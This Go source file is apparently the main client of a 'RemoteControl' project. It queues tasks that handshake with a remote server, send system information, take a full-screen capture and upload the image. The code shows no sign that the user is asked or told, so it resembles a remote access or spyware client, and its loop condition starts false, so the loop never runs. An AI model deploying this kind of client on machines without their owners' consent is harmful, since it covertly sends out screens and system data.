package main

import (
	"RemoteControl/pkg/remote"
	"RemoteControl/pkg/runtime"
	"RemoteControl/pkg/shared"
	"fmt"
	"io/ioutil"
	"net/http"
	"strconv"
	"strings"
)

// Whether the server is being connected
var GIsLinkingWithServer = false

//Post("http://xxxx","application/json;charset=utf-8",[]byte("{'aaa':'bbb'}"))
func Post(url string, contentType string, body []byte) (string, error) {
	res, err := http.Post(url, contentType, strings.NewReader(string(body)))
	if err != nil {
		return "", err
	}
	defer res.Body.Close()
	content, err := ioutil.ReadAll(res.Body)
	if err != nil {
		return "", err
	}
	return string(content), nil
}

var taskAry []string

func main() {
	taskAry = append(taskAry, []string{
		shared.TASK_HANDSHAKE,
		shared.TASK_SYSTEMINFO,
		shared.TASK_CAPTURESCREEN}...,
	)

	for GIsLinkingWithServer {
		if len(taskAry) > 0 {
			task := taskAry[0]
			taskAry = taskAry[1:]
			switch task {
			case shared.TASK_HANDSHAKE:
				GIsLinkingWithServer = remote.TestServerLink()
			case shared.TASK_SYSTEMINFO:
				osid, osName := runtime.GetSystem()
				remote.SendMsg(fmt.Sprintf("操作系统：%s\n", osName))
				remote.SendMsg(runtime.GetSystemInfo(osid))
			case shared.TASK_CAPTURESCREEN:
				filename := remote.CaptureFullScreen()
				filesize := strconv.FormatInt(remote.GetFileSize(filename), 10)
				remote.SendMsg("screen_" + filename + "_" + filesize)
				// 发送文件
				remote.SendFile(filename)
				remote.GConn.Close()
			}
		}
	}
}
